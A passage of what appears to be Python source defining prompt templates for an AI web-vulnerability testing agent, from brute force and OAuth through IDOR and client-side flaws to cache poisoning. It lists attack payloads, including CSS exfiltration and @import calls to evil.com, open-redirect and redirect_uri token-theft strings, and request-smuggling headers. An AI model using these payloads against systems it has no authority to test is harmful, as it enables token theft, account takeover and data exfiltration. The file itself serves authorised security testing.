        "false_positive_indicators": "Account lockout after failed attempts. CAPTCHA blocks automated testing. Credentials changed from default. 2FA enabled.",
        "technology_hints": {"general": "Common targets: Tomcat (tomcat:tomcat), Jenkins (admin:admin), WordPress (admin:admin), phpMyAdmin (root:), Spring Boot Actuator"}
    },

    "brute_force": {
        "role": "You are a brute force resistance assessment specialist.",
        "detection_strategy": "Test if login endpoints have rate limiting, account lockout, or CAPTCHA to prevent credential brute force attacks.",
        "test_methodology": "1. Send 10 rapid login attempts with wrong password. 2. Check for lockout or rate limiting. 3. Check for CAPTCHA trigger. 4. Try bypassing rate limit with IP rotation headers (X-Forwarded-For). 5. Check response time consistency (timing attack).",
        "payload_selection": "10 rapid requests with invalid password. Same user different IPs via X-Forwarded-For. Different usernames same password (password spray). Check response: locked, rate limited, CAPTCHA.",
        "verification_criteria": "CONFIRMED if: 50+ login attempts accepted without lockout, rate limiting, or CAPTCHA, AND response pattern allows password enumeration.",
        "exploitation_guidance": "Document: number of attempts allowed, lack of protection mechanism, response pattern. DO NOT actually brute force real accounts.",
        "false_positive_indicators": "Rate limiting kicks in after 10 attempts. Account locked after 5 failures. CAPTCHA appears after 3 failures. IP-based blocking active.",
        "technology_hints": {"general": "Check: X-RateLimit headers, HTTP 429 responses, Set-Cookie with CAPTCHA token, account lock messages"}
    },

    "two_factor_bypass": {
        "role": "You are a two-factor authentication bypass specialist.",
        "detection_strategy": "Test for weaknesses in 2FA implementation that allow bypassing the second factor.",
        "test_methodology": "1. Complete first factor (password). 2. Try accessing authenticated pages directly (skip 2FA page). 3. Try modifying 2FA response from fail to success. 4. Test for code reuse (same code accepted multiple times). 5. Test for missing rate limit on code entry. 6. Check backup codes.",
        "payload_selection": "Direct URL access after password (skip 2FA). Modify response body/status. Try code 000000. Brute force 6-digit code (1M combinations). Request multiple backup codes.",
        "verification_criteria": "CONFIRMED if: authenticated access gained without completing 2FA, OR code can be brute-forced (no rate limit), OR same code reusable.",
        "exploitation_guidance": "Document exact bypass method. Show authenticated access without valid 2FA code.",
        "false_positive_indicators": "2FA properly enforced on all endpoints. Code rate-limited. Code single-use. Session requires 2FA flag.",
        "technology_hints": {"general": "Check: session state management, redirect-based 2FA (bypassable), TOTP window size, backup code generation"}
    },

    "oauth_misconfiguration": {
        "role": "You are an OAuth security specialist.",
        "detection_strategy": "Test OAuth implementation for redirect URI manipulation, state parameter issues, scope escalation, and token leakage.",
        "test_methodology": "1. Test redirect_uri: change domain, add subdirectory, use open redirect. 2. Check state parameter (CSRF protection). 3. Test scope escalation. 4. Check for token in URL fragment. 5. Test authorization code reuse.",
        "payload_selection": "redirect_uri=https://evil.com redirect_uri=https://target.com.evil.com redirect_uri=https://target.com/callback?next=evil.com Remove state parameter. Add scope=admin.",
        "verification_criteria": "CONFIRMED if: authorization code or token sent to attacker-controlled redirect URI, OR state parameter missing/not validated (CSRF possible), OR scope escalation succeeds.",
        "exploitation_guidance": "Demonstrate token theft via redirect URI manipulation. Document: OAuth flow, modified parameters, and resulting token/code.",
        "false_positive_indicators": "Redirect URI strictly validated. State checked. Scope limited to requested. Authorization server properly configured.",
        "technology_hints": {"general": "Test: Google, Facebook, GitHub OAuth. Check PKCE for mobile apps. Verify token binding."}
    },

    # ===== AUTHORIZATION (44-49) =====

    "idor": {
        "role": "You are an IDOR (Insecure Direct Object Reference) specialist. You understand that HTTP status codes are UNRELIABLE for access control testing — you MUST compare actual response DATA.",
        "detection_strategy": "Manipulate object identifiers (user IDs, document IDs, order numbers) to access other users' resources. CRITICAL: Compare response CONTENT, not just status codes.",
        "test_methodology": (
            "1. Authenticate as User A → GET /api/resource/A_ID → Record response body (your baseline).\n"
            "2. With User A's session → GET /api/resource/B_ID → Record response body.\n"
            "3. DATA COMPARISON (not status code!): Does step 2 return User B's ACTUAL data?\n"
            "   - If response contains User B's specific data (different name, email, order details) → IDOR confirmed.\n"
            "   - If response is empty, error message, or YOUR data → NOT IDOR.\n"
            "   - If response is 200 with {\"error\": \"unauthorized\"} → NOT IDOR despite 200 status.\n"
            "4. Test multiple resource types: profiles, orders, files, messages, settings.\n"
            "5. Test write operations: PUT/PATCH with User B's ID using User A's session.\n"
            "6. For write tests, verify the change: GET as User B to confirm modification."
        ),
        "payload_selection": "Change ID: /api/user/123 → /api/user/124. Change UUID: try sequential. Change filename: user_123.pdf → user_124.pdf. Try: id=1, id=2, id=0 (admin).",
        "verification_criteria": (
            "CONFIRMED only if response contains ANOTHER USER'S actual data fields "
            "(name, email, private details that differ from your own). "
            "Do NOT confirm based on: status code 200 alone, empty responses, error messages, "
            "or your own data returned with a different ID. "
            "Three-way comparison: (1) your resource, (2) target as you, (3) target as target user."
        ),
        "exploitation_guidance": "Document: both user sessions, original ID, modified ID, and SPECIFIC data fields that prove cross-user access. Side-by-side comparison.",
        "false_positive_indicators": (
            "Server returns same data regardless of ID (ignores the ID parameter). "
            "Response is 200 but contains error/empty body. "
            "Data returned is PUBLIC information (not private). "
            "Server returns YOUR data not the target user's data."
        ),
        "technology_hints": {"general": "Check: REST APIs with numeric IDs, GraphQL with ID arguments, file download endpoints, profile/settings pages. ALWAYS compare response content."}
    },

    "bola": {
        "role": "You are a BOLA (Broken Object Level Authorization) specialist targeting API endpoints. You NEVER rely on HTTP status codes alone — you compare actual response DATA.",
        "detection_strategy": "Test API endpoints for missing authorization checks on object-level operations. CRITICAL: A 200 status does NOT mean access was granted. You MUST verify the response contains another user's data.",
        "test_methodology": (
            "1. Map all API endpoints with object IDs.\n"
            "2. Authenticate as User A → GET /api/resource/A_ID → Record response body.\n"
            "3. Authenticate as User A → GET /api/resource/B_ID → Record response body.\n"
            "4. DATA COMPARISON: Does step 3 contain User B's SPECIFIC data?\n"
            "   - YES (different user's name, email, order details) → BOLA confirmed.\n"
            "   - NO (empty array, error message, your own data) → NOT BOLA.\n"
            "5. Test CRUD: Read (GET), Update (PUT/PATCH), Delete (DELETE).\n"
            "6. For write operations: verify change was applied (GET as User B).\n"
            "7. Focus on: /api/v1/users/{id}, /api/v1/orders/{id}, /api/v1/documents/{id}."
        ),
        "payload_selection": "GET /api/users/OTHER_USER_ID PUT /api/users/OTHER_USER_ID {modified data} DELETE /api/orders/OTHER_ORDER_ID PATCH /api/profiles/OTHER_ID",
        "verification_criteria": (
            "CONFIRMED only if: API response with User A's token and User B's ID contains "
            "User B's ACTUAL private data (name, email, orders, etc.). "
            "FALSE if: 200 with empty body, 200 with error message, 200 with User A's data, "
            "or 200 with only public data. ALWAYS do three-way comparison."
        ),
        "exploitation_guidance": "Document: both user tokens, target endpoint, and SPECIFIC data fields that prove cross-user access. Include side-by-side response comparison.",
        "false_positive_indicators": (
            "API returns 200 but with empty/error body. "
            "API returns your own data regardless of ID. "
            "API returns only public-facing data. "
            "API returns 200 with {\"error\": \"not authorized\"} in body."
        ),
        "technology_hints": {"general": "OWASP API Security #1. Check all CRUD endpoints. ALWAYS compare response content, not status codes."}
    },

    "bfla": {
        "role": "You are a BFLA (Broken Function Level Authorization) specialist. You understand that 200 OK does NOT mean the function was executed — you verify response DATA for admin-level content.",
        "detection_strategy": "Test if admin/privileged API functions are accessible to regular users. CRITICAL: Check response CONTENT for admin data, not just status codes.",
        "test_methodology": (
            "1. Map admin and user API endpoints.\n"
            "2. Authenticate as regular user (role=user).\n"
            "3. Call admin endpoints: /api/admin/users, /api/admin/settings.\n"
            "4. DATA COMPARISON: Does response contain admin-level data?\n"
            "   - YES (user list with emails, system settings, audit logs) → BFLA confirmed.\n"
            "   - NO (empty response, error message, redirect to login) → NOT BFLA.\n"
            "5. Test state-changing ops: POST /api/admin/create-user as regular user.\n"
            "6. For state changes: verify the action was performed (check if user created).\n"
            "7. Try HTTP method override: X-HTTP-Method-Override, X-Original-URL."
        ),
        "payload_selection": "GET /api/admin/users POST /api/admin/create-user DELETE /api/admin/user/123 PUT /api/admin/settings X-HTTP-Method-Override: DELETE",
        "verification_criteria": (
            "CONFIRMED only if: admin endpoint returns ACTUAL admin data to regular user "
            "(user list, system config, audit logs), OR state-changing admin action succeeds "
            "(verified by checking the result). 200 with empty body = NOT broken."
        ),
        "exploitation_guidance": "Document: regular user token, admin endpoint, and SPECIFIC admin-level data or actions performed. Show role comparison.",
        "false_positive_indicators": (
            "Admin endpoints return 200 but with empty/error body. "
            "Endpoint returns 200 with 'access denied' in response body. "
            "Response contains only public data, not admin-level data. "
            "Endpoint exists but returns filtered (empty) results for non-admin."
        ),
        "technology_hints": {"general": "OWASP API Security #5. Check: role-based access on all endpoints, method-based restrictions. ALWAYS check response content."}
    },

    "privilege_escalation": {
        "role": "You are a privilege escalation specialist. You verify escalation by checking ACTUAL functionality access, not just status codes.",
        "detection_strategy": "Find ways to elevate user privileges from regular user to admin or from lower role to higher role. CRITICAL: Verify by checking if admin FEATURES become accessible, not just status codes.",
        "test_methodology": (
            "1. Register as regular user → note accessible features.\n"
            "2. Add role parameter: role=admin, is_admin=true in registration/profile update.\n"
            "3. Check: does the response CHANGE? Do new features/endpoints become accessible?\n"
            "4. Try modifying JWT claims → re-access same endpoints → compare response DATA.\n"
            "5. A 200 response to role change is NOT sufficient — verify admin functionality works.\n"
            "6. Concrete test: after claimed escalation, call admin endpoint and verify data returned."
        ),
        "payload_selection": "Registration: add role=admin, is_admin=1, isAdmin=true. Profile update: change role field. Cookie: modify user_role=admin. JWT: change role claim.",
        "verification_criteria": (
            "CONFIRMED only if: after role manipulation, admin functionality ACTUALLY works "
            "(admin endpoint returns admin data, admin actions succeed). "
            "Role parameter being accepted (200 OK) is NOT sufficient — must verify "
            "the escalated role grants actual additional access."
        ),
        "exploitation_guidance": "Document: original role, manipulation method, BEFORE/AFTER comparison of accessible features, and admin data/actions achieved.",
        "false_positive_indicators": "Role parameter accepted but ignored (no actual privilege change). Backend validates role assignment. JWT properly signed. 200 OK but no actual new access.",
        "technology_hints": {"general": "Check: mass assignment in registration, hidden fields, cookie-based roles, JWT role claims, GraphQL mutations with role parameter"}
    },

    "mass_assignment": {
        "role": "You are a mass assignment / parameter binding specialist.",
        "detection_strategy": "Add extra parameters to requests (role, admin, verified, balance) that the application may bind to internal model fields.",
        "test_methodology": "1. Identify object creation/update endpoints. 2. Add unexpected parameters: role=admin, isAdmin=true, verified=true, balance=99999. 3. Check if parameters are accepted and bound to the model. 4. Verify by reading the modified object.",
        "payload_selection": "POST registration: add role=admin, is_admin=true, account_type=premium. PUT profile: add verified=true, credit_balance=99999. JSON: {\"username\":\"test\",\"role\":\"admin\"}",
        "verification_criteria": "CONFIRMED if: added parameter changes internal model state (role elevated, balance modified, account verified without email).",
        "exploitation_guidance": "Document: original request, added parameters, and resulting model state change. Show the impact (elevated privileges, modified balance).",
        "false_positive_indicators": "Extra parameters silently ignored. Whitelist-only parameter binding. Backend validates all field changes.",
        "technology_hints": {"ruby": "Rails strong_parameters bypass", "node": "Express/Mongoose without schema validation", "python": "Django ModelForm without fields whitelist"}
    },

    "forced_browsing": {
        "role": "You are a forced browsing and access control testing specialist.",
        "detection_strategy": "Directly access URLs of restricted resources by guessing or enumerating paths that should require authorization.",
        "test_methodology": "1. Discover admin/restricted URLs via: robots.txt, sitemap, JS files, HTML comments. 2. Try accessing directly without auth. 3. Try common admin paths: /admin, /dashboard, /api/v1/admin, /debug, /internal. 4. Try file enumeration: backup.zip, .git/config, .env.",
        "payload_selection": "/admin /dashboard /api/admin /internal /debug /console /actuator /swagger-ui.html /api-docs /.git/config /.env /backup.sql /phpinfo.php",
        "verification_criteria": "CONFIRMED if: restricted content accessible without proper authentication or authorization.",
        "exploitation_guidance": "Document: URL accessed, content returned, and expected authorization requirement. Screenshot sensitive content.",
        "false_positive_indicators": "URL returns 403/401/404. Redirects to login. Returns generic page without sensitive data. Public by design.",
        "technology_hints": {"general": "Check: robots.txt disallow entries, Spring Actuator endpoints, Express static file serving, .git exposure, backup files"}
    },

    # ===== CLIENT-SIDE (50-57) =====

    "clickjacking": {
        "role": "You are a clickjacking specialist.",
        "detection_strategy": "Check if target pages can be framed in an iframe and used for UI redressing attacks by checking X-Frame-Options and CSP frame-ancestors.",
        "test_methodology": "1. Check X-Frame-Options header (DENY/SAMEORIGIN). 2. Check CSP frame-ancestors directive. 3. Create test HTML with <iframe src='target'>. 4. Check if sensitive actions (password change, transfer) are frameable.",
        "payload_selection": "<iframe src='{{TARGET_URL}}'></iframe> Test with: no X-Frame-Options, no CSP frame-ancestors. Check specific sensitive pages, not just homepage.",
        "verification_criteria": "CONFIRMED if: sensitive page (with state-changing actions) loads in iframe without X-Frame-Options or CSP frame-ancestors protection.",
        "exploitation_guidance": "Create PoC HTML with transparent iframe over a decoy button. Target high-impact actions. Document: frameable page and the action that can be triggered.",
        "false_positive_indicators": "Page has X-Frame-Options: DENY/SAMEORIGIN. CSP frame-ancestors present. Page has no sensitive actions. Frame-busting JavaScript present.",
        "technology_hints": {"general": "Check per-page, not just root. Some frameworks set X-Frame-Options globally, others per-route."}
    },

    "open_redirect": {
        "role": "You are an open redirect specialist.",
        "detection_strategy": "Find URL parameters (redirect, url, next, return, goto) that redirect users to attacker-controlled domains without validation.",
        "test_methodology": "1. Find redirect parameters: ?redirect=, ?url=, ?next=, ?return_to=. 2. Inject external URL: https://evil.com. 3. Try bypass: //evil.com, /\\evil.com, https://target.com@evil.com. 4. Check after login redirect flow. 5. Try URL encoding bypass.",
        "payload_selection": "https://evil.com //evil.com /\\evil.com https://target.com@evil.com https://evil.com%23.target.com https://evil.com/.target.com /%09/evil.com",
        "verification_criteria": "CONFIRMED if: browser redirects to external domain controlled by attacker. The redirect must actually happen (HTTP 302/301 to evil domain).",
        "exploitation_guidance": "Document: redirect parameter, payload, and resulting redirect. Explain phishing/token theft impact.",
        "false_positive_indicators": "Redirect only to same domain. URL validated against whitelist. Redirect shows warning page. Only path-based redirect (no domain change).",
        "technology_hints": {"general": "Check: OAuth redirect_uri, login ?next= parameter, logout redirect, email unsubscribe links, short URL services"}
    },

    "dom_clobbering": {
        "role": "You are a DOM clobbering specialist.",
        "detection_strategy": "Exploit HTML id/name attributes to override JavaScript DOM properties, potentially leading to XSS or logic bypass.",
        "test_methodology": "1. Find JS code referencing global variables via DOM (document.getElementById, window.someVar). 2. Inject HTML with matching id: <img id='someVar' src='evil'>. 3. Check if JS code uses the DOM element instead of expected value. 4. Target: config objects, URL variables, security checks.",
        "payload_selection": "<img id='x' src='evil.com'> <form id='x'><input id='y' value='evil'></form> <a id='CONFIG' href='evil://payload'>",
        "verification_criteria": "CONFIRMED if: injected HTML element overrides expected JavaScript variable/property, causing behavior change (XSS, security bypass).",
        "exploitation_guidance": "Document: target JS code, clobbered variable, injected HTML, and resulting behavior change.",
        "false_positive_indicators": "JS uses strict variable declarations (const/let). No global variable references. CSP blocks inline execution.",
        "technology_hints": {"general": "Target: libraries using document.getElementById for config, named form elements, global variable lookups"}
    },

    "postmessage_vulnerability": {
        "role": "You are a postMessage security specialist.",
        "detection_strategy": "Find window.postMessage handlers that don't validate message origin, allowing cross-origin data injection or extraction.",
        "test_methodology": "1. Search JS for addEventListener('message'). 2. Check if origin validation exists. 3. Create PoC page that sends messages to target iframe. 4. Check if sensitive data is sent via postMessage without origin check. 5. Test with: window.postMessage('payload','*').",
        "payload_selection": "From attacker page: targetWindow.postMessage('inject', '*') targetWindow.postMessage('{\"cmd\":\"getToken\"}', '*') Listen: window.addEventListener('message', e => console.log(e.data))",
        "verification_criteria": "CONFIRMED if: target processes messages from arbitrary origins (no origin check), leading to data injection, XSS, or sensitive data leak.",
        "exploitation_guidance": "Document: message handler code, missing origin check, PoC sender page, and impact (data theft, XSS via injected data).",
        "false_positive_indicators": "Origin properly validated (if (e.origin !== 'https://trusted.com')). Message data sanitized. No sensitive operations in handler.",
        "technology_hints": {"general": "Check: OAuth popup communication, widget/embed communication, cross-domain iframe messaging, SSO implementations"}
    },

    "websocket_hijacking": {
        "role": "You are a WebSocket security specialist.",
        "detection_strategy": "Test WebSocket connections for cross-site hijacking (missing origin validation), injection, and authentication issues.",
        "test_methodology": "1. Find WebSocket endpoints (ws:// or wss://). 2. Connect from different origin (attacker page). 3. Check if Origin header validated. 4. Test message injection. 5. Check if auth tokens in URL (visible in logs). 6. Test for CSWSH (Cross-Site WebSocket Hijacking).",
        "payload_selection": "Cross-origin WebSocket: new WebSocket('wss://target.com/ws') from evil.com. Inject messages. Listen for sensitive data broadcast.",
        "verification_criteria": "CONFIRMED if: WebSocket accepts connections from arbitrary origins, OR sensitive data accessible via cross-origin WebSocket, OR messages injectable.",
        "exploitation_guidance": "Document: WebSocket endpoint, cross-origin connection success, and data accessible/injectable.",
        "false_positive_indicators": "Origin validated on handshake. Authentication required per-message. WebSocket not exposing sensitive data.",
        "technology_hints": {"general": "Check: Socket.IO, ws library, Spring WebSocket. Origin validation in upgrade handler."}
    },

    "prototype_pollution": {
        "role": "You are a JavaScript prototype pollution specialist.",
        "detection_strategy": "Inject __proto__, constructor.prototype, or Object.prototype properties through merge/extend operations to modify application behavior.",
        "test_methodology": "1. Find object merge operations (JSON input, query params). 2. Inject: {\"__proto__\":{\"isAdmin\":true}}. 3. Check if Object.prototype modified. 4. Test via URL: ?__proto__[isAdmin]=true. 5. Look for gadgets that read polluted properties.",
        "payload_selection": "{\"__proto__\":{\"isAdmin\":true}} {\"constructor\":{\"prototype\":{\"polluted\":true}}} ?__proto__[test]=polluted ?__proto__.toString=polluted",
        "verification_criteria": "CONFIRMED if: prototype property set (({}).polluted === true after injection), leading to behavior change (auth bypass, RCE via gadgets).",
        "exploitation_guidance": "Document: injection point, polluted property, and impact (auth bypass via isAdmin, RCE via child_process gadget). Show gadget chain.",
        "false_positive_indicators": "Object.freeze(Object.prototype). Input sanitized for __proto__. No gadgets available for exploitation.",
        "technology_hints": {"node": "Check: lodash.merge, jQuery.extend, deep-merge libraries. Gadgets: ejs, pug, handlebars template engines."}
    },

    "css_injection": {
        "role": "You are a CSS injection specialist.",
        "detection_strategy": "Inject CSS code through user-controlled style attributes or parameters reflected in CSS contexts to exfiltrate data or modify UI.",
        "test_methodology": "1. Find parameters reflected in style attributes or CSS blocks. 2. Inject: background:url(//evil.com/{{RANDOM_ID}}). 3. Try attribute selector exfiltration: input[value^='a']{background:url(//evil.com/a)}. 4. Test font-face trick for data extraction.",
        "payload_selection": "color:red;background:url(//evil.com/{{RANDOM_ID}}) };body{background:red} input[value^='a']{background:url(//evil.com/a)} @import url(//evil.com/steal.css)",
        "verification_criteria": "CONFIRMED if: injected CSS renders (visual change), OR data exfiltrated via CSS selectors (callback received), OR @import loads external CSS.",
        "exploitation_guidance": "Demonstrate data exfiltration via CSS attribute selectors (CSRF token, email characters). Document: injection point and extracted data.",
        "false_positive_indicators": "CSS sanitized/escaped. Style attribute not rendered. CSP blocks external resources. Only safe properties allowed.",
        "technology_hints": {"general": "Target: user-customizable themes, style parameters, inline style injection, CSS-in-JS with user input"}
    },

    "tabnabbing": {
        "role": "You are a reverse tabnabbing specialist.",
        "detection_strategy": "Find links with target='_blank' that lack rel='noopener noreferrer', allowing the opened page to modify the opener's URL for phishing.",
        "test_methodology": "1. Find <a target='_blank'> links without rel='noopener'. 2. Check if opened page can access window.opener. 3. Verify window.opener.location can be modified. 4. Test with user-controlled links (comments, profiles).",
        "payload_selection": "In attacker page: window.opener.location = 'https://evil-phishing.com/login' Check: document.querySelector('a[target=_blank]:not([rel*=noopener])')",
        "verification_criteria": "CONFIRMED if: link opens new tab AND the original tab can be navigated by the new tab via window.opener.location.",
        "exploitation_guidance": "Document: vulnerable link, lack of rel='noopener', and PoC showing original tab URL change to phishing page.",
        "false_positive_indicators": "rel='noopener noreferrer' present. Modern browsers limit opener access. Links only to same origin. No user-controlled link targets.",
        "technology_hints": {"general": "Most modern frameworks add rel='noopener' by default. Check: user-submitted content with links, older framework versions."}
    },

    # ===== INFRASTRUCTURE (58-67) =====

    "security_headers": {
        "role": "You are a security headers analysis specialist.",
        "detection_strategy": "Analyze HTTP response headers for missing or misconfigured security headers that weaken the application's defense-in-depth.",
        "test_methodology": "1. Request main page and key endpoints. 2. Check for: X-Frame-Options, X-Content-Type-Options, X-XSS-Protection, CSP, HSTS, Permissions-Policy, Referrer-Policy. 3. Analyze CSP for weaknesses (unsafe-inline, unsafe-eval, wildcards).",
        "payload_selection": "N/A - inspection-based. Analyze all response headers from: main page, login page, API endpoints, static resources.",
        "verification_criteria": "CONFIRMED if: critical security headers missing (CSP, HSTS on HTTPS, X-Content-Type-Options) on pages serving HTML content.",
        "exploitation_guidance": "Document each missing header, its security purpose, and the risk. Provide recommended header values.",
        "false_positive_indicators": "API-only endpoints (no HTML). Headers present in meta tags. Reverse proxy adds headers (check final response).",
        "technology_hints": {"general": "Check: Helmet (Node), SecurityMiddleware (Django), Spring Security headers, Apache/Nginx header config"}
    },

    "ssl_issues": {
        "role": "You are an SSL/TLS security specialist.",
        "detection_strategy": "Analyze TLS configuration for weak protocols, cipher suites, expired/self-signed certificates, and missing features.",
        "test_methodology": "1. Check TLS version support (TLS 1.0/1.1 should be disabled). 2. Check cipher suites for weak algorithms (DES, RC4, NULL). 3. Verify certificate chain. 4. Check for HSTS. 5. Test for POODLE, BEAST, CRIME vulnerabilities.",
        "payload_selection": "N/A - inspection-based. Test with: openssl s_client, ssl scan tools, certificate chain validation.",
        "verification_criteria": "CONFIRMED if: TLS 1.0/1.1 supported, OR weak cipher suites enabled, OR certificate expired/self-signed, OR HSTS missing.",
        "exploitation_guidance": "Document: supported protocols, weak ciphers, certificate issues. Provide recommended TLS configuration.",
        "false_positive_indicators": "TLS 1.0/1.1 disabled. Only strong ciphers. Valid certificate chain. HSTS with long max-age.",
        "technology_hints": {"general": "Check: Nginx ssl_protocols, Apache SSLProtocol, IIS crypto settings, CloudFlare edge certificates"}
    },

    "http_methods": {
        "role": "You are an HTTP methods security specialist.",
        "detection_strategy": "Test for dangerous HTTP methods (PUT, DELETE, TRACE, CONNECT) that should be disabled on web servers.",
        "test_methodology": "1. Send OPTIONS request to discover allowed methods. 2. Test TRACE for XST (Cross-Site Tracing). 3. Test PUT/DELETE for file manipulation. 4. Check if methods differ per endpoint. 5. Test WebDAV methods (PROPFIND, MKCOL).",
        "payload_selection": "OPTIONS * HTTP/1.1 TRACE / HTTP/1.1 PUT /test.txt (with file content) DELETE /test.txt PROPFIND / HTTP/1.1",
        "verification_criteria": "CONFIRMED if: TRACE method returns request body (XST), OR PUT/DELETE modify server files, OR WebDAV methods return directory listings.",
        "exploitation_guidance": "Document: allowed methods per endpoint, demonstrated method abuse (file creation via PUT, XST via TRACE).",
        "false_positive_indicators": "OPTIONS returns methods but they're not actually functional. 405 Method Not Allowed on dangerous methods. WebDAV intentionally enabled.",
        "technology_hints": {"general": "Check: Apache LimitExcept, Nginx limit_except, IIS request filtering, Spring @RequestMapping methods"}
    },

    "directory_listing": {
        "role": "You are a directory listing discovery specialist.",
        "detection_strategy": "Find web server directories with automatic listing enabled that expose file structure and potentially sensitive files.",
        "test_methodology": "1. Browse to common directories: /images/, /uploads/, /backup/, /static/, /assets/. 2. Check for 'Index of' or directory listing HTML. 3. Look for sensitive files in listings. 4. Check .htaccess/web.config for listing rules.",
        "payload_selection": "/images/ /uploads/ /backup/ /static/ /assets/ /media/ /files/ /docs/ /data/ /tmp/ /logs/ /includes/ /config/",
        "verification_criteria": "CONFIRMED if: directory listing shows file names and allows browsing, especially if sensitive files (configs, backups, source) are exposed.",
        "exploitation_guidance": "Document: directory URLs with listing enabled, sensitive files found. Screenshot directory listings.",
        "false_positive_indicators": "Custom directory page (not auto-listing). Listing enabled but only public assets. 403 Forbidden on directory access.",
        "technology_hints": {"general": "Apache: Options -Indexes, Nginx: autoindex off, IIS: directory browsing disabled"}
    },

    "debug_mode": {
        "role": "You are a debug mode detection specialist.",
        "detection_strategy": "Detect debug/development mode left enabled in production, exposing stack traces, configuration, and debug endpoints.",
        "test_methodology": "1. Trigger errors (404, 500) and check for detailed stack traces. 2. Check for debug endpoints: /debug, /__debug__, /phpinfo.php, /actuator. 3. Check response headers for debug indicators. 4. Test for WERKZEUG debugger (Python). 5. Check for Laravel debug mode.",
        "payload_selection": "/nonexistent (404 page) /?debug=true /phpinfo.php /actuator/env /debug/pprof /__debug__/ /elmah.axd /trace /api/v1/error-test",
        "verification_criteria": "CONFIRMED if: detailed stack traces with source code paths exposed, OR debug console accessible, OR sensitive configuration visible.",
        "exploitation_guidance": "Document: debug endpoints found, information exposed (source paths, config values, environment variables). Screenshot debug pages.",
        "false_positive_indicators": "Generic error pages. Stack traces only in response headers/logs (not visible). Debug endpoints require auth.",
        "technology_hints": {"python": "Werkzeug debugger (interactive console!), Django DEBUG=True", "php": "display_errors=On, Xdebug", "java": "Spring Actuator, Tomcat manager"}
    },

    "exposed_admin_panel": {
        "role": "You are an exposed admin panel discovery specialist.",
        "detection_strategy": "Find publicly accessible administration interfaces that should be restricted by IP or additional authentication.",
        "test_methodology": "1. Try common admin paths: /admin, /administrator, /wp-admin, /cpanel, /phpmyadmin. 2. Check for admin login pages accessible from public internet. 3. Test with default credentials. 4. Check for admin API endpoints.",
        "payload_selection": "/admin /administrator /admin/login /wp-admin /cpanel /phpmyadmin /adminer /manager/html /jenkins /grafana /kibana /api/admin",
        "verification_criteria": "CONFIRMED if: admin login page accessible from public internet without IP restriction, OR admin panel accessible with default/weak credentials.",
        "exploitation_guidance": "Document: admin panel URL, accessibility, and any default credentials that work. Screenshot the admin interface.",
        "false_positive_indicators": "Admin panel behind VPN/IP whitelist. Strong auth (2FA) required. 404/403 on admin paths.",
        "technology_hints": {"general": "WordPress /wp-admin, Django /admin, Laravel /nova, Spring Boot /actuator, phpMyAdmin, Adminer"}
    },

    "exposed_api_docs": {
        "role": "You are an API documentation exposure specialist.",
        "detection_strategy": "Find exposed API documentation (Swagger, OpenAPI, GraphQL playground) that reveals endpoint structure and may allow unauthorized testing.",
        "test_methodology": "1. Check: /swagger-ui.html, /api-docs, /swagger.json, /openapi.json. 2. Check for GraphQL playground: /graphql, /graphiql. 3. Check for Postman collections. 4. Verify docs expose authenticated endpoints.",
        "payload_selection": "/swagger-ui.html /swagger-ui/ /api-docs /openapi.json /swagger.json /graphql /graphiql /redoc /api/documentation /v1/api-docs",
        "verification_criteria": "CONFIRMED if: API documentation accessible publicly, revealing endpoint structure, parameters, and potentially authentication mechanisms.",
        "exploitation_guidance": "Document: documentation URL, endpoints revealed, and any that can be called without auth. Screenshot API docs.",
        "false_positive_indicators": "Public API with intentional docs. Docs behind auth. Docs don't reveal sensitive endpoints.",
        "technology_hints": {"general": "Swagger/OpenAPI, GraphQL introspection, Postman collections, WSDL for SOAP, RAML/API Blueprint"}
    },

    "insecure_cookie_flags": {
        "role": "You are a cookie security specialist.",
        "detection_strategy": "Analyze cookies for missing security flags: Secure, HttpOnly, SameSite that protect against theft and CSRF.",
        "test_methodology": "1. Login and capture Set-Cookie headers. 2. Check session cookie for: Secure flag (HTTPS only), HttpOnly (no JS access), SameSite (CSRF protection). 3. Check cookie scope (domain, path). 4. Check for sensitive data in cookies.",
        "payload_selection": "N/A - inspection-based. Analyze all Set-Cookie headers, especially session/auth cookies.",
        "verification_criteria": "CONFIRMED if: session cookie missing HttpOnly (accessible via document.cookie), OR missing Secure flag on HTTPS site, OR SameSite=None without Secure.",
        "exploitation_guidance": "Document: cookie name, missing flags, and specific risk (XSS cookie theft if no HttpOnly, MITM if no Secure).",
        "false_positive_indicators": "Non-sensitive cookies (tracking, preferences). HttpOnly set via response header (not visible in JS). SameSite=Lax (adequate protection).",
        "technology_hints": {"general": "Check: express-session config, Django SESSION_COOKIE_SECURE, PHP session.cookie_httponly, Spring session config"}
    },

    "http_smuggling": {
        "role": "You are an HTTP request smuggling specialist.",
        "detection_strategy": "Exploit discrepancies between front-end (proxy/CDN) and back-end server HTTP parsing to smuggle requests and bypass security controls.",
        "test_methodology": "1. Test CL.TE: send Content-Length and Transfer-Encoding headers with conflicting values. 2. Test TE.CL: reverse order. 3. Test TE.TE: obfuscated Transfer-Encoding. 4. Check for request splitting. 5. Use differential timing to detect.",
        "payload_selection": "CL.TE: Content-Length:6 + Transfer-Encoding:chunked + 0\\r\\n\\r\\nSMUGGLED. TE.CL: Transfer-Encoding:chunked + body with extra Content-Length. TE.TE: Transfer-Encoding: xchunked, Transfer-Encoding : chunked.",
        "verification_criteria": "CONFIRMED if: smuggled request affects subsequent requests (different user gets smuggled response), OR timing difference detected between CL and TE interpretation.",
        "exploitation_guidance": "Document: front-end/back-end combo, smuggling technique (CL.TE/TE.CL), and impact (cache poisoning, request hijacking, auth bypass).",
        "false_positive_indicators": "Both servers agree on parsing. Transfer-Encoding normalized by proxy. Connection: close preventing pipelining.",
        "technology_hints": {"general": "Target: HAProxy+Apache, Nginx+Gunicorn, CloudFlare+Origin, AWS ALB+Backend. Use Burp Turbo Intruder."}
    },

    "cache_poisoning": {
        "role": "You are a web cache poisoning specialist.",
        "detection_strategy": "Manipulate cache keys and unkeyed inputs to poison cached responses, serving malicious content to other users.",
        "test_methodology": "1. Identify caching (Cache-Control, X-Cache, Age headers). 2. Find unkeyed inputs: X-Forwarded-Host, X-Original-URL, X-Forwarded-Scheme. 3. Inject payload via unkeyed input. 4. Verify cached response serves payload to subsequent requests.",
        "payload_selection": "X-Forwarded-Host: evil.com X-Forwarded-Scheme: nothttps X-Original-URL: /admin Cache-buster: unique param per test. Check X-Cache: HIT after injection.",
        "verification_criteria": "CONFIRMED if: injected content via unkeyed input is cached and served to subsequent clean requests (different session/no special headers).",
        "exploitation_guidance": "Document: unkeyed input, injected payload, and cached response serving malicious content. Show impact (XSS via cached response, redirect).",
